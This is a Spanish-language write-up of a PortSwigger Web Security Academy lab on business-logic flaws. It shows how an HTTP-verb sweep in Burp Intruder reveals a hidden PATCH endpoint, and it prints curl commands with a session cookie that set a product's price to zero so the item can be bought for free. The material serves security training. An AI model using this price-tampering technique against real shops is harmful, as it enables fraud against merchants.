---
title: API Testing Lab 2
date: 2025-02-16 12:26:00 +0800
author: Justice-Reaper
categories:
  - Portswigger
  - Business Logic Vulnerabilities
tags:
  - Business
  - Logic
  - Vulnerabilities
  - Inconsistent
  - security
  - controls
image:
  path: /assets/img/Business-Logic-Vulnerabilities-Lab-3/Portswigger.png
---

## Skills

- Finding and exploiting an unused API endpoint

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Para `resolver` el laboratorio, debemos explotar un `endpoint oculto de la API` para comprar una `Lightweight l33t Leather Jacket`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---
## Web Enumeration

Al `acceder` a la `web` nos sale esto

![[image_1.png]]

Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`

![[image_2.png]]

Si nos `abrimos` el `código fuente` de la `web` nos encontramos estos

![[image_3.png]]

Si accedemos a `https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/resources/js/api/productPrice.js` vemos este contenido

```
const Container = class {
    constructor(message, innerClasses, outerClasses) {
        this.message = message;
        this.innerClasses = innerClasses;
        this.outerClasses = outerClasses;
    }

    #build() {
        const outer = document.createElement('div');
        outer.setAttribute('class', this.outerClasses.join(' '))

        const inner = document.createElement('p');
        inner.setAttribute('class', this.innerClasses.join(' '));
        inner.innerHTML = this.message;

        outer.appendChild(inner);

        return outer;
    }

    static Error(message) {
        return new Container(message, ['is-warning'], ['error-message', 'message-container']).#build();
    }

    static ProductMessage(message) {
        return new Container(message, ['product-messaging-content'], ['product-messaging-banner', 'message-container']).#build();
    }

    static RemoveAll() {
        [...document.getElementsByClassName('message-container')].forEach(e => e.parentNode.removeChild(e));
    }
};

const getAddToCartForm = () => {
    return document.getElementById('addToCartForm');
};

const setPrice = (price) => {
    document.getElementById('price').innerText = price;
};

const showErrorMessage = (target, message) => {
    Container.RemoveAll();
    target.parentNode.insertBefore(Container.Error(message), target);
};

const showProductMessage = (target, message) => {
    Container.RemoveAll();
    target.parentNode.insertBefore(Container.ProductMessage(message), target);
};

const handleResponse = (target) => (response) => {
    if (response.error) {
        showErrorMessage(target, `Failed to get price: ${response.type}: ${response.error} (${response.code})`);
    } else {
        setPrice(response.price);
        if (response.message) {
            showProductMessage(target, response.message);
        }
    }
};

const loadPricing = (productId) => {
    const url = new URL(location);
    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
        .then(res => res.json())
        .then(handleResponse(getAddToCartForm()));
};

window.onload = () => {
    const url = new URL(location);
    const productId = url.searchParams.get('productId');
    if (url.pathname.startsWith("/product") && productId != null) {
        loadPricing(productId);
    }
};
```

Pulsamos sobre `View details > Add to cart` para añadir un producto a nuestro carrito

![[image_4.png]]

Si nos abrimos `Burpsuite` y nos dirigimos a la extensión `Logger ++` vemos que al `añadir` un `producto` al `carrito` se hace una petición a `/api/products/1/price`

![[image_5.png]]

`Mandamos` la `petición` al `Intruder` y marcamos `GET`

![[image_6.png]]

`Añadimos` el `payload` llamado `HTTP verbs`

![[image_7.png]]

```
GET
POST
HEAD
CONNECT
PUT
TRACE
OPTIONS
DELETE
ACL
ARBITRARY
BASELINE-CONTROL
BCOPY
BDELETE
BIND
BMOVE
BPROPFIND
BPROPPATCH
CHECKIN
CHECKOUT
COPY
DEBUG
INDEX
LABEL
LINK
LOCK
MERGE
MKACTIVITY
MKCALENDAR
MKCOL
MKREDIRECTREF
MKWORKSPACE
MOVE
NOTIFY
ORDERPATCH
PATCH
POLL
PROPFIND
PROPPATCH
REBIND
REPORT
RPC_IN_DATA
RPC_OUT_DATA
SEARCH
SUBSCRIBE
TRACK
UNBIND
UNCHECKOUT
UNLINK
UNLOCK
UNSUBSCRIBE
UPDATE
UPDATEREDIRECTREF
VERSION-CONTROL
X-MS-ENUMATTS
```

`Inspeccionamos` las `respuestas` recibidas y vemos un `código de estado 400` con esta `respuesta`

![[image_8.png]]

`Enviamos` esta `petición` y nos responde que nos falta un `parámetro` en el `body`

```
# curl -X PATCH -s --cookie 'session=FAsAkXfF7a0bDzIPfF7Pwtsf7xTczZUQ' -H 'Content-Type: application/json' https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/api/products/1/price --data '{}'          
{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}  
```

`Modificamos` el `precio` del `artículo` aparentemente

```
# curl -X PATCH -s --cookie 'session=FAsAkXfF7a0bDzIPfF7Pwtsf7xTczZUQ' -H 'Content-Type: application/json' https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/api/products/1/price --data '{"price":0}'         
{"price":"$0.00"} 
```

Si nos `dirigimos` a la `web` podemos confirmarlo

![[image_9.png]]

`Pulsamos` sobre `Place Order` y `compramos` el `artículo`

![[image_10.png]]

![[image_11.png]]
